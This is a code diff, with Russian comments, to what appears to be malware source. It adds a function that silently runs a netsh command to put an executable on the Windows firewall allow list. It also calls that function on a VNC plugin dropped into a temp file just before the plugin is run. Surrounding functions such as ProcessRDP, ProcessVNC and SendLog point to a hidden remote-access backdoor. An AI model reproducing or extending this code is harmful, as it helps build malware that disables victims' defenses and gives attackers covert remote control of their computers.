@@ -530,6 +530,44 @@ bool SendLog( int server, const char* name, int code, const char* text )
 	return true;
 }
 
+//добавляет указанный файл в список разрешенных браундмаузера винды
+static bool AddAllowedprogram( const char* pathExe )
+{
+	char name[64];
+	//формируем имя правила на осноне имени exe
+	char* pn1 = (char*)pPathFindFileNameA(pathExe);
+	char* pn2 = (char*)pPathFindExtensionA(pathExe);
+	int pnlen = pn2 ? pn2 - pn1 : m_lstrlen(pn1);
+	if( pnlen >= sizeof(name) - 1 ) pnlen = sizeof(name) - 1;
+	m_memcpy( name, pn1, pnlen );
+	name[pnlen] = 0;
+
+	//делаем текущей директорией папку windows\system32\wbem, для того чтобы
+	//команда выполнилась без проблем на всех машинах (без этого не везде может сработать)
+	char currDir[MAX_PATH], systemDir[MAX_PATH];
+	pGetCurrentDirectoryA( sizeof(currDir), currDir );
+	pGetSystemDirectoryA( systemDir, sizeof(systemDir) );
+	pPathAppendA( systemDir, "wbem" );
+	pSetCurrentDirectoryA(systemDir);
+
+	//по версии windows выбираем формат команды
+	char* cmd = (char*)HEAP::Alloc(512);
+	fwsprintfA pwsprintfA = Get_wsprintfA();
+    OSVERSIONINFOA ver;
+    ver.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA); 
+    pGetVersionExA(&ver);
+	const char* format =  ver.dwMajorVersion >= 6 ? NetshFirewallWin7 : NetshFirewallWinXp;
+	pwsprintfA( cmd, GetStr(format).t_str(), pathExe, name );
+	
+	VDRDBG( "Video", "%s", cmd );
+	bool ret = RunFileA( cmd, true, true );
+
+	HEAP::Free(cmd);
+	pSetCurrentDirectoryA(currDir);
+	
+	return ret;
+}
+
 DWORD WINAPI ProcessRDP(void*)
 {
 	typedef int (WINAPIV* PINIT) (char* config);
@@ -600,6 +638,7 @@ DWORD WINAPI ProcessVNC(void*)
 		File::GetTempName(fileName);
 		if( File::WriteBufferA(fileName, data, c_data) == c_data)
 		{
+			AddAllowedprogram(fileName); //добавляем в список разрешенных
 			VDRDBG( "Video", "vnc.plug saved in %s", fileName );
 			if( RunFileA(fileName))
 			{
